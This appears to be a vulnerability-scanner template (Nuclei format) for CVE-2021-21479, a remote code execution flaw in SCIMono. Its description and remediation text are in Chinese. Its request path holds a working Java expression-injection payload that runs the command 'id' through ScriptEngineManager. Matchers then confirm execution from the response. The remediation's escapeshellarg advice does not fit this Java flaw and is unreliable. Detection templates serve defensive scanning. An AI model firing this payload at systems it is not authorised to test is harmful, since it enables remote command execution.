id: CVE-2021-21479
info:
  name: SCIMono <0.0.19 - Remote Code Execution
  author:
  - dwisiswant0
  description: |-
    SCIMono 代码注入漏洞
    SCIMono 是（Parvan Dobrev）开源的一个应用程序。提供一个服务器端和客户端。

    SCIMono 中存在代码注入漏洞，攻击者有可能注入并执行java表达式，从而损害系统的可用性和完整性。以下产品及型号受到影响：SCIMono 0.0.19 之前版本。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://github.com/SAP/scimono/security/advisories/GHSA-29q4-gxjq-rx5c

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“;”会被转义为“\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - The attribute value
    - java.lang.UNIXProcess@
    - has invalid value!
    - '"status" : "400"'
  path:
  - '{{BaseURL}}/Schemas/$%7B''''.class.forName(''javax.script.ScriptEngineManager'').newInstance().getEngineByName(''js'').eval(''java.lang.Runtime.getRuntime().exec("id")'')%7D'
  method: GET
